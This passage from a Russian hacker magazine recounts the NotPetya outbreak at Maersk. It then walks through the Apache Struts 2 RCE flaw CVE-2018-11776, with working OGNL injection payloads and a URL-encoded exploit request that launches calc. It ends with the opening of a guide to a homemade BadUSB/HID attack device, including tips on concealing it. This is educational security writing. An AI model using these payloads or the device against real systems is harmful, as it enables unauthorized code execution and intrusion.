полна захватывающих подробностей, но во многом показа‐
тельна.


ПЕТЯ ИЛИ НЕ ПЕТЯ?
Первое упоминание Petya датируется еще 2016 годом, когда эксперты ком‐
пании G Data сообщили, что обна ружена опас ная вымогательская мал варь.
Petya работал по прин ципу крип толокера: предотвращал загрузку ОС, шиф‐
ровал все данные и про сил выкуп за рас шифровку, уведомляя жертву, что
диск компьютера зашифрован «военным алгорит мом шифрования».
  В основном Petya атаковал рекрутеров, рас сылая письма от якобы отклик‐
нувшихся на определенную вакансию людей. В само письмо злоумышленники
добавляли ссылку на полное портфо лио на Dropbox. Вместо PDF или файла
Word, в формате которых соискатели обычно посылают свои резюме и пор‐
тфолио, по ссылке находился исполняемый файл application_portfolio‐
packed.exe.
  Запуск приводил к падению системы в «синий экран смерти» и последу‐
ющей перезагрузке. Перед непос редс твенным ребутом малварь портила
MBR жесткого диска и перехватывала управление процессом загрузки.





                        Требование выкупа

После ребута поль зователь мог наблюдать имитацию проверки дис ка (CHKD‐
SK), но, когда она оканчивалась, видел не продолжение загрузки, а сооб‐
щение от «Пети». В нем говорилось, что все фай лы на жес тком диске зашиф‐
рованы, любое их восстановление невозможно. В качестве способа вернуть
нажитое Petya предлагал пользователю зап латить выкуп в 0,9 биткойна (при‐
мерно 380 долларов на 2016 год) в течение семи дней. В противном случае
Petya удваивал сумму до 1,8 биткойна.


NOTPETYA — ПРИЕМНЫЙ РЕБЕНОК PETYA
В 2017 году Petya снова дал о себе знать — но уже в модифицированной вер‐
сии. ИБ‐специалисты назвали этот шифроваль щик NotPetya (или SortaPetya,
ExPetr, Petna, Nyetya). Ведь пос ле детального изу чения малвари обнаружи‐
лось, что от старого Petya в коде оста лось совсем немного.
  Для первого преодоления периметра вымогатель использует почтовый
спам, скрываясь внутри вредонос ных документов Microsoft Oﬃce и эксплуати‐
руя  уязвимость  CVE‐2017‐0199 —  обход  защитных  механизмов Oﬃce
для исполнения произвольного кода в системе. Этот экс плоит был най ден
в 2017 году, в апреле программисты Microsoft закрыли уяз вимость патчем.
  Проникнув в систему, NotPetya использует технику Mimikatz, которая поз‐
воляет получить пароли пользователей Windows из оперативной памяти, что‐
бы затем атаковать другие машины в локальной сети. Это давний и хорошо
известный    экспло ит,    открытый    француз ским    исследователем
еще в 2011 году.
  Следующий инструмент в наборе «Не‐Пети» силь но напоминает эксплоит
ETERNALBLUE, который был похищен у АНБ и выложен в открытый дос туп
хакерской группой The Shadow Brokers. «Лаборатория Кас перского» отме‐
тила,  что  авторы малвари  использовали  также ETERNALROMANCE —
еще один инструмент, укра денный у спецслужб.
  ETERNALBLUE позволяет экс плуатировать уяз вимость в протоколе SMB:
отправка специально сформированных пакетов дает возможность выполнять
произвольный код на уда ленной машине.
   Закрепив шись в системе и заразив все соседние компьютеры, NotPetya
шифрует MFT (Master File Table) раз делов NTFS и перезаписы вает Master Boot
Record своим загрузчиком, который показывает типичное вымогательское
сообщение. Это одна из немногих вещей, которые были позаимствованы
у Petya.





                  Выдержка из кода NotPetya

В отличие от Petya и WannaCry, который также экс плуатировал ETERNALBLUE,
NotPetya — это не настоящий вымога тель. Авторы вируса явно не собирались
зарабатывать на нем день ги. Запрошенную сумму можно было отправить
на указанный кошелек, но это ни к чему не вело. Не известно ни одного слу‐
чая, когда кому‐то пришел бы ключ для расшифровки.
  Еще одна инте ресная примета заключается в том, что NotPetya всегда
предлагал один и тот же номер кошелька. Мошенники обычно стараются
заметать следы, делая как можно больше кошельков, чтобы потом было легче
отмывать полученные в качес тве выкупа деньги.


             INFO

                     Подробнее о ходе зараже ния читай в нашем отче‐
                         те «Petya, NotPetya или Petna? Все, что нужно
                        знать о новой эпидемии».


ИБ‐специалист, известный как The Grugg, высказал предположение о том, что
NotPetya — это не обычный вирус‐шифроваль щик, созданный с целью
вымогательства. По  его мнению, модернизированная версия  Petya —
это кибероружие, нацеленное на дестабилизацию крупных компаний.
  Белый дом поддержал мнение эксперта и обви нил Россию в создании
NotPetya для дестабилизации обстановки в Укра ине, пообещав доказать при‐
частность Кремля  к распространению шифроваль щика и наказать всех
виновных. Многие зарубежные эксперты также считают, что NotPetya был соз‐
дан российскими хакерами для скрытия следов вмешательства России в аме‐
риканские выборы 2016 года.


NOTPETYA НАПАЛ НА РАССВЕТЕ
Если жертвами Petya были в основном специалисты в области HR, то NotPetya
уже играл по‐крупному. Среди трофеев мал вари оказались такие гиганты,
как Сбербанк, «Роснефть», «Баш нефть», «Хоум Кредит» и дру гие, — и это
только в России.
  Центром эпидемии стала Укра ина, поэто му пострадала больше всех: бан‐
ки, отделения поч ты, аэропорты, правительственные сайты и энергетичес кие
компании в один голос заявляли о кибератаке. В списке пос традавших были
Национальный банк Укра ины, аэропорт Харькова и даже компьютеры спе‐
циалистов, которые работа ют над устранени ем пос ледствий инцидента
на Чернобыльской АЭС.
  Все остальные страны тоже ощутили на себе гнев «Не‐Пети». Например,
в США компания FedEx заявила, что ата ка NotPetya нанесла убытки больше
чем на 400 миллионов долларов. Среди других пострадавших — фармацев‐
тический гигант Merck (870 миллионов), француз ская строительная компания
«Сен‐Гобен» (384 миллиона), американский производитель сладостей Mon‐
delēz (компания владеет более известной у нас Cadbury), британская Reckitt
Benckiser (владельцы брен да Durex) и другие крупные и мел кие предприятия.
  В Дании же наиболь ший удар приняла на себя компания Maersk. Под‐
робности, которые удалось соб рать журналистам издания Wired, позволяют
оценить масштаб урона, который вредонос ное ПО наносит крупному биз‐
несу. Источники Wired внутри компании пожела ли остаться неизвестны ми,
опасаясь  наказания  за  несанкционированные беседы  с репортерами.
Но именно подробности из этих анонимных рас сказов делают отчет Wired
столь интересным.


NOTPETYA ИГРАЕТ В МОРСКОЙ БОЙ
27 июня 2017 года в датской компании Maersk, которая отвечает за львиную
долю всех морских грузоперевозок, даже не подоз ревали, что бизнес вскоре
будет взят на абор даж. И речь не о пиратах — NotPetya начал по очереди
выводить из строя компьютеры подразделения Maersk Line. Даже центр тех‐
нической поддержки Maersk сам стал нуждать ся в поддержке.
   Сотрудники Maersk один за дру гим видели на экранах рабочих лэптопов
сообщения «Восстанов ление файлов на диске C» с просьбой не выключать
и не перезагружать систему. А кое‐кто уже дождался до предложения зап‐
латить за расшифровку данных и удаление вируса из сис темы несколько сот
долларов США в биткойнах. Утро в штаб‐квартире Maersk явно началось не с
кофе.





             Вряд ли такая картинка сулит что‐то хорошее

NotPetya вскоре посетил и IT‐отдел, где в этот момент программисты готови‐
ли обновление программного обеспечения для более чем 80 тысяч сотрудни‐
ков Maersk. Вирус начал отключать машины ИТ‐отдела, рас пространяясь
по сети с пугающей скоростью. Изна чально жертвы NotPetya не могли осоз‐
нать масштаб и ужас надвигавшейся на них опасности. Кто‐то судорожно
пытался перезагрузить компь ютер, кто‐то пенял на сбои в работе головного
офиса, кто‐то вставал в очередь в оказавшийся беспомощным отдел тех‐
поддержки.
  В этот момент NotPetya уже вовсю заражал десят ки офисов Maersk в раз‐
ных городах и странах и шифровал данные сот рудников. Сотни заблокиро‐
ванных компьютеров дали понять: Maersk ата кова на.


С чего все началось
В июне 2017 года хакеры взло мали серверы Linkos, отве чавшие за рассылку
обновлений программного комплекса M.E.Doc. Предприятия Украины поль‐
зовались M.E.Doc для хранения документов в электронном виде. Именно
одесский офис дал начало эпидемии: на компь ютере финдиректора офиса
был установлен M.E.Doc. Так NotPetya и про ник в периметр сети Maersk.



СВИСТАТЬ ВСЕХ НАВЕРХ!
Пока NotPetya постепенно выводил Maersk из строя, сотрудники техподдер‐
жки бегали по всему зда нию штаб‐квартиры, предупреждая своих коллег
и подопечных о надвига ющейся опасности. Единс твенным решением было
отключать еще не успевшее заразиться оборудование от электросети, чем
и занимались системные администраторы.
   Когда работоспособных компь ютеров уже не оста лось, сотрудни кам прос‐
то стало нечего делать и многие из них начали расходиться по домам,
не зная, когда они смогут вернуть ся на работу и смогут ли вообще. Сам
исполнительный директор Maersk заявил, что ни он, ни отдел ИТ не в силах
бороться с вирусом. Он добавил, что не знает, сколь ко вре мени уйдет на вос‐
становление работы.





И МОРЕ ИМЕЕТ ДНО
Пострадала далеко не только штаб‐квартира Maersk. В ходе рас сле дования
журналисты Wired побеседова ли с клиента ми компании и с работниками пор‐
та в Нью‐Джерси (одного из 76 портов, где работает Maersk). Оказалось, что
основной бедой для них стал выход из строя портовых терминалов, которые
принимают с кораблей данные о гру зах.
  В одном только Нью‐Джерси через порт за день проезжает три тысячи
фур, забитых самыми разными товара ми — от дет ских игрушек до машин
и тракторов. Когда выяснилось, что узнать о содержимом контейнеров
без программы невозможно, работа вста ла.





NotPetya таким образом смог вывести из строя 17 портов, где работала Maer‐
sk. В том же Нью‐Джерси ворота были намертво заб локированы и не пропус‐
кали никого к кораблям Maersk, а рации диспетчеров пре дательски молчали.
Водители грузовиков просили впустить грузы в порт — но работники не могли
им ничем помочь. Никто из сот рудников не получал никаких предупреждений
или сообщений от руководс тва Maersk, и неведение постепенно стало прев‐
ращаться в панику клиентов и оша рашенных работников.
  Поскольку часть грузов — это скоропортящиеся продукты, многие контей‐
неры было необходимо как можно быс трее дос тавить до места наз начения.
Склады компании тоже были заблокированы, и даже тем партнерам, которым
удавалось добыть свой груз с корабля, ока зыва лось негде его хранить. При‐
ходилось срочно прив лекать дру гих перевозчиков и арендовать новые пло‐
щади неподалеку, цены на которые моментально взлетели. Все это обошлось
в сотни тысяч долларов — как самой компании, так и ее клиентам.
  А на следующий день ока залось, что не работа ет система приема заказов
на сайте Maersk. Компания была полностью парализована.


ШТАБ БОРЦОВ С «НЕ-ПЕТЕЙ»
Wired рассказывает, что спус тя несколько дней после инцидента Maersk
в срочном порядке соб рала в английском городе Мейденхед сотрудников
со всего земного шара: большинство из них приезжало в главный офис
ИТ‐подразделения Maersk Group Infrastructure Services буквально с чемода‐
нами в руках. Работать приходилось круглые сутки, и народ спал по углам
офисов и в конференц‐залах. Нервы, как и компь ютеры Maersk, выдерживали
не у всех.
  На подмогу пришли специалисты консалтинговой компании  Deloitte.
Одновременно в офисе Мейденхеда мог ли находиться до 200 сотрудников
Deloitte и до 400 представителей Maersk.
  Всю зараженную технику у сот рудников конфисковали и прибывающим
выдавали свежие ноутбуки, прося как можно скорее начинать работать. Пос‐
тепенно большая часть данных была вос становлена из бэкапов, отдельные
из которых были созданы за 3–7 дней до ава рии.
  И только по чистой случайности и по невероятному везению сисадминам
Maersk удалось спасти пос леднюю копию данных контрол леров домена.
На них хранились учетные данные 88 тысяч сотрудни ков компании, и в случае
потери всю эту базу пришлось бы соз давать заново.


АФРИКАНСКИЕ ПРИКЛЮЧЕНИЯ
Всего у Maersk было 150 контроллеров домена Windows, которые никто
и никогда не бэкапил. Синхро низируясь друг с другом, они образуют децен‐
трализованную сеть: считается, что это защищает данные надежнее любого
бэкапа. Но не когда все эти 150 серверов одновременно выводит из строя
злой шифровальщик.
   Когда казалось, что уже все потеря но, сот рудникам Maersk улыбнулась
удача: они обнаружили, что офис компании в Гане в этот день не работал
из‐за отключения электричес тва и это позволило одному из контрол леров
домена избежать заражения. Вот так по счас тливой слу чайности децентра‐
лизация таки сработала!
  Однако праздновать победу админам Maersk было еще рано. Бэкап
занимал несколько сот гигабайт, а интернет в Гане не отличается рекордны‐
ми скоростями. Передача данных обещала занять несколько суток, которые
влетели бы в новые миллионы. При этом ни у кого из офи са в Гане не было
британской визы, и пришлось организовывать передачу жесткого диска
при личной встрече двух сотрудников в Нигерии.
  Постепенно работос пособность Maersk воз растала, главный сайт был
готов принять заказы клиентов, а операторы и работники портов смогли
наконец получать информа цию обо всех гру зах. Но первые несколько дней
сотрудники Maersk работали через все дос тупные средства: в ход шли личные
аккаунты Gmail и даже WhatsApp. Сотрудник, который принимал через мес‐
сенджер несколько сот заказов в день, до сих пор вспоминает об этом с сод‐
роганием.





Компания постепен но вставала с больничной койки и расправляла плечи. Но,
как и любая болезнь, NotPetya имел последс твия — сотни гигабайт ценной (и
не очень) информации на компь ютерах Maersk все же ушли в никуда. Равно
как и сотни миллионов долларов.


ПОСЛЕДСТВИЯ В ЦИФРАХ И ДЕТАЛЯХ
За десять дней, начиная с 27 июня, сотрудни ки Maersk смогли восстановить
более 4000 серверов и 45 000 персоналок. Мно го? Да, много, но и убытки
колоссальные: пример но 300 миллионов дол ларов пошли мимо кошелька
компании из‐за атаки NotPetya. И это только официальные цифры: все
источники Wired как один говорят, что они серьезно занижены. Ведь для ком‐
пании такого масштаба не к лицу рас сказывать о своих неудачах всю правду.
  Последовавший разбор полетов показал, как печально у Maersk обстояли
дела с безопасностью. Показа тельно уже то, что часть ключевых машин
работала на Windows  2000, обновления которой  Microsoft прекратила
в далеком 2009 году. Эксперты, обсуждая ситуацию с Maersk, вырази ли свое
единогласное мнение: если бы в компании уделяли безопас ности больше
внимания, то на восста новление после атаки ушло бы в разы меньше вре‐
мени.


МАЛВАРЬ СЕЙ БАСНИ
Если раньше слово «вирус» у широкой публики ассо циировалось с переуста‐
новкой Windows и фор матиро ванием жесткого дис ка, то сейчас последствия
уже  начинают напоминать  техногенную  катас трофу.  NotPetya  навредил
не только рядовым пользователям, но и компани ям‐гигантам, банковским
системам, грузоперевоз чикам и так далее. Боль шинство из них при этом
предпочитает скрывать пос ледс твия и занижать убытки, боясь лишний раз
выдать неадекватный уровень подготовки к подобным инцидентам. Был Not‐
Petya кибероружием или нет — в данном случае даже не так важно. Само
существование  столь  разрушительных  для  гло бальной  инфраструктуры
напастей может изменить очень многое. И ско рее всего — не в лучшую сто‐
рону.
ВЗЛОМ

ПРОСТРАНСТВО
ДЛЯ ЭКСПЛУАТАЦИИ





             КАК РАБОТАЕТ НОВАЯ
            RCE‐УЯЗВИМОСТЬ

                   aLLy           В APACHE STRUTS 2                 ONsec
                 @iamsecurity





Во фреймворке Apache Struts 2, виновном в утечке данных у Equifax, нашли
очередную дыру. Она поз воляет зло умышленнику, не имея никаких прав
в системе, выполнить произвольный код от имени того пользователя,
от которого запущен веб‐сервер. Давай пос мотрим, как эксплу атируется эта
уязвимость.


             INFO

                   В 2017 году мы рассмотрели две уязвимости
                        в Struts 2, обе из которых приводили к выпол‐
                     нению произвольного кода в системе. Одна была
                        связана с реализацией REST API, а другая как раз
                        с парсингом языка OGNL (кстати, именно она
                      и подвела Equifax).


Баг обнаружил исследователь Мань Юэ Мо (Man Yue Mo) из Semmle Security
Research team 10 апреля 2018 года. Под угро зой ока зались все версии фрей‐
мворка до 2.3.34 и 2.5.16 вклю читель но. Атакующий может внедрить собс‐
твенный namespace в приложение с помощью параметра в HTTP‐запросе.
При этом он никак не филь труется приложением Struts и может быть про‐
извольной строкой, которая затем попада ет в парсер языковых конс трукций
OGNL (Object‐Graph Navigation Language). А это прямая дорога к RCE.
   Уязвимость получила внутренний идентифика тор S2‐057 (CVE‐2018‐11776)
и статус критической. Давай разбирать ся, какие промахи допустили раз‐
работчики на этот раз.


СТЕНД
Один из немногих случаев, ког да поднятие стенда на Java не представляет
никаких проблем. В качес тве веб‐сервера я буду использовать Apache Tom‐
cat версии 8.5.20 для Windows. Фреймворк возьму последней уязвимой вер‐
сии ветки 2.3 — 2.3.34. Скачать ее мож но с официального сервера архивных
версий.
  В архиве нас будет интересовать только файл struts2‐showcase.war
из папки apps. По сути, это тот же архив в формате ZIP. Прос то распакуй его
в директорию webapps/struts2‐showcase.
   Это почти все приготовления. Осталось только соз дать комфортные усло‐
вия для тестирования уяз вимости. Для этого отредактируем содержимое
файла struts‐actionchaining.xml из директории struts2‐showcase/WEB‐
INF/classes.


/webapps/struts2-showcase/WEB-INF/classes/struts-
actionchaining.xml
<?xml version="1.0" encoding="UTF‐8" ?>
<!DOCTYPE struts PUBLIC
  "‐//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
  "http://struts.apache.org/dtds/struts‐2.3.dtd">
<struts>
  <package name="actionchaining" extends="struts‐default">
    <action name="actionChain1" class="org.apache.struts2.showcase.
actionchaining.ActionChain1">
      <result type="redirectAction">
        <param name = "actionName">comehere</param>
      </result>
    </action>
  </package>
</struts>

После    этого    запускаем    сервер,    переходим    по    адресу
http://127.0.0.1:8080/struts2‐showcase/index.action и наблюдаем при ветствен‐
ную страницу с примерами использования Struts 2.





          Готовый к эксперимен там стенд с Apache Struts 2.3.34

Если у тебя Linux, то рекомендую взять Docker и поднять стенд одной коман‐
дой:


$ docker run ‐d ‐p 8080:8080 vulhub/struts2:2.3.34‐showcase

После этого не забудь отредактировать файл /usr/local/tomcat/webapps/
ROOT/WEB‐INF/classes/struts‐actionchaining.xml   и   перезапустить
Tomcat.
  Возникло желание немного подебажить? Тогда твой выбор — IntelliJ IDEA.
Просто открой папку с исходниками (/struts‐2.3.34/src), в ней и настрой
запуск сервера с приложением Showcase через Maven.





     Конфигурация запус ка приложения Struts 2 Showcase в IntelliJ IDEA

Дальше можешь выбирать  пункт Debug из меню Run, ставить брейки
и дебажить как тебе взду мается.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ПРОСТРАНСТВО ДЛЯ
      ЭКСПЛУАТАЦИИ
              КАК РАБОТАЕТ НОВАЯ RCE‐УЯЗВИМОСТЬ
                            В APACHE STRUTS 2





ДЕТАЛИ УЯЗВИМОСТИ
Существует несколь ко кейсов, при которых возможна экс плуатация уяз‐
вимости. Первый из них — когда опция alwaysSelectFullNamespace уста‐
новлена в true. Такую нас трой ку, например, использует очень популярный
плагин для Struts под наз ванием Convention.


/plugins/convention/src/main/resources/struts-plugin.xml
...
<struts order="20">
  ...
  <constant name="struts.mapper.alwaysSelectFullNamespace" value=
"true"/>
  ...

Если твое приложение использует этот плагин, зна чит, оно уязвимо. Struts
Showcase его исполь зует.


/struts2-showcase/META-INF/maven/org.apache.struts/struts2-
showcase/pom.xml
...
<dependency>
  <groupId>org.apache.struts</groupId>
  <artifactId>struts2‐convention‐plugin</artifactId>
</dependency>
...

Второй вариант — если приложение использует дей ствия (actions), которые
сконфигурированы без указания конкрет ного прос транства имен (name‐
space), или использует в качес тве него символы подстановки (/*). Это отно‐
сится не только к действиям, определен ным внут ри конфигурационных фай‐
лов  Struts, но и  к пространс тву имен, исполь зуемых непос редственно
в исходном коде. Пом нишь, во время поднятия стенда мы изменяли файл
struts‐actionchaining.xml? Тем самым мы создали условия для воз‐
можной атаки.


/webapps/struts2-showcase/WEB-INF/classes/struts-
actionchaining.xml
...
<result type="redirectAction">
  <param name = "actionName">comehere</param>
</result>
...

Существует несколь ко типов тега result, которые уязвимы, если исполь‐
зовать их без указания пространс тва имен:
 • redirectAction — указывает, что после выполнения текущего экшена нужно
   передать управле ние на дру гой;
 • postback — тип результата, отоб ражает текущие параметры запроса
   в виде формы, которая передает данные в ука занное место наз начения;
 • chain — используется, когда необходимо объеди нить несколько экшенов
   в одну последовательную цепочку, результат которой передать поль‐
   зователю.

В нашем случае указан redirectAction, то есть если вызывается метод ac‐
tionChain1, то приложение редиректит нас на comehere.


GET /struts2‐showcase/actionChain1.action HTTP/1.1
Host: struts.vh:8080
Connection: close





  Использование типа redirectAction в теге result. Редирект на указанный
  экшен

Это поведение обрабатывается классом ServletActionRedirectResult. Он
имплементирует метод execute, который отрабатывает при каждом вызове
действия.


/org/apache/struts2/dispatcher/ServletActionRedirectResult.java
128: public class ServletActionRedirectResult extends ServletRedirect
Result implements ReflectionExceptionHandler {
...
165:   public void execute(ActionInvocation invocation) throws Except
ion {
166:     actionName = conditionalParse(actionName, invocation);
167:     if (namespace == null) {
168:       namespace = invocation.getProxy().getNamespace();
169:     } else {
170:       namespace = conditionalParse(namespace, invocation);
171:     }

Обрати внимание на работу с пространс твом имен. Если оно не указано
для экшена, на который про исходит редирект, то выполняется конструкция
invocation.getProxy().getNamespace().   Она   получает   namespace
из родительского экшена, который вызывает comehere.





        Отладка метода execute класса ServletActionRedirectResult

Так как наш метод — корневой, то и namespace будет равен /. Теперь поп‐
робуем сде лать вызов вида custom/actionChain1.action.


GET /struts2‐showcase/custom/actionChain1.action HTTP/1.1
Host: struts.vh:8080
Connection: close





        Манипулирование пространством имен с помощью URI

Приложение думает, что custom — это тоже экшен, и использует его в прос‐
транстве имен при формирова нии редиректа. Пос мотрим, что происходит
с ним дальше по коду.


/org/apache/struts2/dispatcher/ServletActionRedirectResult.java
178: String tmpLocation = actionMapper.getUriFromActionMapping(new
ActionMapping(actionName, namespace, method, null));

Метод getUriFromActionMapping воз вра щает текущий URI до экшена,
на который делаем редирект. Он извлекается из экземпляра объ екта Action‐
Mapping.


/org/apache/struts2/dispatcher/mapper/DefaultActionMapper.java
487: public String getUriFromActionMapping(ActionMapping mapping) {
488:   StringBuilder uri = new StringBuilder();
489:
490:   handleNamespace(mapping, uri);
491:   handleName(mapping, uri);
492:   handleDynamicMethod(mapping, uri);
493:   handleExtension(mapping, uri);
494:   handleParams(mapping, uri);
495:
496:   return uri.toString();
497: }





              Отладка метода getUriFromActionMapping

Далее полученная строка отправляется в setLocation в качестве аргумента.


/org/apache/struts2/dispatcher/ServletActionRedirectResult.java
178: String tmpLocation = actionMapper.getUriFromActionMapping(new
ActionMapping(actionName, namespace, method, null));
179:
180: setLocation(tmpLocation);


org/apache/struts2/dispatcher/StrutsResultSupport.java
106: public abstract class StrutsResultSupport implements Result,
StrutsStatics {
...
143:   public void setLocation(String location) {
144:     this.location = location;
145:   }

И наконец, вызывается метод execute из родительского клас са StrutsRe‐
sultSupport.


/org/apache/struts2/dispatcher/ServletActionRedirectResult.java
165: public void execute(ActionInvocation invocation) throws Except
ion {
...
180:   setLocation(tmpLocation);
181:
182:   super.execute(invocation);
183: }


/org/apache/struts2/dispatcher/StrutsResultSupport.java
106: public abstract class StrutsResultSupport implements Result,
StrutsStatics {
...
189:   public void execute(ActionInvocation invocation) throws Except
ion {
190:     lastFinalLocation = conditionalParse(location, invocation);

Теперь наша строка отправляется в conditionalParse.


/org/apache/struts2/dispatcher/StrutsResultSupport.java
201: protected String conditionalParse(String param, ActionInvocation
 invocation) {
202:   if (parse && param != null && invocation != null) {
203:     return TextParseUtil.translateVariables(
204:       param,
205:       invocation.getStack(),
206:       new EncodingParsedValueEvaluator());
207:   } else {
208:     return param;
209:   }
210: }





    Вызов conditionalParse из родительского класса StrutsResultSupport

Затем строка направляется в TextParseUtil.translateVariables.


/com/opensymphony/xwork2/util/TextParseUtil.java
38: public class TextParseUtil {
...
73:   public static String translateVariables(String expression,
ValueStack stack, ParsedValueEvaluator evaluator) {
74:     return translateVariables(new char[]{'$', '%'}, expression,
stack, String.class, evaluator).toString();
75:   }





                 От ладка метода translateVariables

Этот метод парсит строку, и если в ней обна ружены язы ковые выраже ния
OGNL, то они выпол няются через OgnlTextParser. Признаком таких выраже‐
ний служат конструкции вида ${} или %{}. Давай отправим вмес то custom
OGNL c простым матема тичес ким действи ем — ${31337+1337}.


GET /struts2‐showcase/actionChain1.action HTTP/1.1
Host: struts.vh:8080
Connection: close





                 От ладка метода translateVariables

После всего путешествия наша строка приземляется в evaluator.evaluate,
где выполняется указанное нами выражение.


/com/opensymphony/xwork2/util/OgnlTextParser.java
08: public class OgnlTextParser implements TextParser {
...
10:   public Object evaluate(char[] openChars, String expression,
TextParseUtil.ParsedValueEvaluator evaluator, int maxLoopCount) {
...
13:     Object result = expression = (expression == null) ? "" :
expression;
...
46:       if ((start != ‐1) && (end != ‐1) && (count == 0)) {
47:         String var = expression.substring(start + 2, end);
48:
49:         Object o = evaluator.evaluate(var);





               Внедрение OGNL‐выражений в Struts 2

Результатом будет число 32 674. В ито ге получа ется URI /32674/comehere.
action, и строка попада ет в метод doExecute.


/org/apache/struts2/dispatcher/StrutsResultSupport.java
189: public void execute(ActionInvocation invocation) throws Except
ion {
...
191:   doExecute(lastFinalLocation, invocation);
192: }





      Успешное выполнение внедренного OGNL‐выраже ния в Struts 2

И происходит редирект на данный URL.





         Редирект на результат внедренно го выражения OGNL

По сути, здесь мы имеем уда ленное выполнение произвольного кода. Чтобы
это провернуть, исполь зуем готовую полезную нагрузку для запуска каль‐
кулятора.


${(#dma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['
struts.valueStack'].context).(#ct.setMemberAccess(#dma)).(@java.lang.
Runtime@getRuntime().exec("calc"))}

Сначала вклю чаем возможность вызова статичных методов в контексте
выражений OGNL. Затем выполняем команду при помощи стандартного
java.lang.Runtime.exec.





           Выполнение произволь ного кода в Struts 2.3.34

Это все отлично работает до тех пор, пока мы отла живаем приложение. А вот
в продакшене некоторые потенциально опас ные классы запрещены к выпол‐
нению в целях безопасности. Одним из первых в их ряду стоит java.lang.
Runtime. Тогда пейлоад превраща ется вот в такого монстра:


${(#dma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['
struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.Action
Context.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.
ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.
getExcludedClasses().clear()).(#ct.setMemberAccess(#dma)).(#cmd=@java
.lang.Runtime@getRuntime().exec("calc"))}

Здесь сначала очищается список зап рещенных для вызова классов, а затем
уже выполняется код.
   Аналогична эксплуата ция с остальными двумя типами result — postback
и chain. Можешь сам проверить, конфиги выглядят примерно так же.


<result type="postback">
  <param name = "actionName">backhere</param>
</result>
<result type="chain">
  <param name = "actionName">chainhere</param>
</result>

Помимо варианта с разными типами result, есть еще одна воз можность экс‐
плуатации уязвимости — когда используются теги s:url. Если страница
с ними вызывается через packages, у которых пространство имен не указано,
то здесь попахивает RCE. Рас смот рим на примере.
   Страница showcase.jsp выводит ся по умолчанию — например, всякий
раз, когда пытаешься обра титься к несущес твующему экше ну.


/src/apps/showcase/src/main/resources/struts.xml
<struts>
  ...
  <package name="default" extends="struts‐default">
    ...
    <default‐action‐ref name="showcase" />
    <action name="showcase">
      <result>/WEB‐INF/showcase.jsp</result>
    </action>
    ...

Добавим в нее строку <s:url/>.


/src/apps/showcase/src/main/webapp/WEB-
INF/showcase.jspshowcase.jsp
14: <body>
15:   <div class="container‐fluid">
16:     <div class="row‐fluid">
17:       <div class="span12">
18:
19:         <div class="hero‐unit">
...
23:         </div>
24:         Current URI: <s:url />
25:       </div>
26:     </div>
27:   </div>





      Добавляем вывод текущего URI страницы в Struts 2 Showcase

Теперь воспользуемся нашим рас ширенным пейлоадом, только здесь нужно
взять конструкцию вида %{}.


GET /struts2‐showcase/%25%7B%28%23dma%3D%40ognl.OgnlContext%40DEFA
ULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueS
tack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.
ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getIns
tance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.
%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExc
ludedClasses%28%29.clear%28%29%29.%28%23ct.setMem
berAccess%28%23dma%29%29.%28%23cmd%3D%40java.lang.Runtime%40getR
untime%28%29.exec%28%22calc%22%29%29%7D/notfound HTTP/1.1
Host: struts.vh:8080
Connection: close

И когда дело дойдет до вывода текущего URL, код выполнится, и перед нами
предстанет окно калькулятора.





  Выполнение произволь ного кода в Struts 2 при использовании тегов s:url


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Уязвимости с попаданием пользовательских данных в парсер OGNL все про‐
должают преследовать фреймворк Struts 2. Одна из них — S2‐045 (CVE‐2017‐
5638) — уже стоила примерно 500 тысяч фунтов. Будем надеяться, что в пос‐
ледних патчах разработчики учли все нюансы и проб лем такого типа теперь
на порядок меньше.  Так  что пос пеши об новить ся на новые версии.
На момент написания статьи это 2.5.17 и 2.3.35.
   Также рекомендую прочитать сам репорт Маня Юэ Мо на LGTM. В нем он
подробно рассказывает, как с помощью ана лиза подобных уязвимос тей
и нескольких запросов на языке Semmle QL уда лось обнаружить описанную
проблему в коде.
ВЗЛОМ
  ЗЛОЙ





   Роман Вегелин
    vegelin47@mail.ru    HID

                          ДЕЛАЕМ
                И ПРОГРАММИРУЕМ
                  ХАКЕРСКИЙ ДЕВАЙС
                      ДЛЯ HID‐АТАК





Универсальность шины USB создает большую поверхность
атаки. Исследователи из Университета Бен‐Гуриона выделя‐
ют почти три десятка хакерских тех ник использования USB.
В данной статье мы рассмотрим один из самых эффективных
вариантов —   автоматизиро ванную  отправку  команд
при помощи самодельного устройства класса HID.


HID-АТАКИ
HID‐атака — хитрая раз новидность BadUSB. Ее суть сводится к тому, что
в  USB‐порт  вставляется  прос тейший  хакерский  девайс,  эму лирующий
устройство ввода. Практически любая современная ОС поддерживает plug‐n‐
play и содержит универсальный драйвер устройства каждого класса. Хакер‐
ский девайс автоматичес ки определяется ОС как нужный нам Human Interface
Device — HID. Далее ОС безо всяких про верок при нимает его команды.
   Есть много готовых девайсов для атак через USB‐порт. Например, Rubber
Ducky и ее разновидности. На мой взгляд, интереснее разобраться, как сде‐
лать такую штуку самому. Это довольно просто (ког да знаешь как) и дешево.
Нам даже флешка на этот раз не понадобится.
  Преимуществ HID‐атаки перед атакой вручную сразу несколько: это ско‐
рость, незаметность и автоматизация. Все необходимые действия выпол‐
нятся быстрее, чем ты смо жешь набрать то же на кла виату ре, и без опечаток
(если их не было изначально). Подключить к USB‐порту мини атюрное устрой‐
ство можно за пару секунд. Это не такое палево, как садиться за чужую кла‐
виатуру и поминутно оглядывать ся через плечо. Из‐за малых габаритов
самодельный девайс лег ко спря тать и пронести через охрану даже на режим‐
ный объект. В крайнем случае можно просто выдать его за флешку и «слу чай‐
но» уничтожить легким нажатием ботинка, после чего изготовить хоть мешок
других таких же.


           WARNING

                        Статья написана в исследовательских целях. Вся
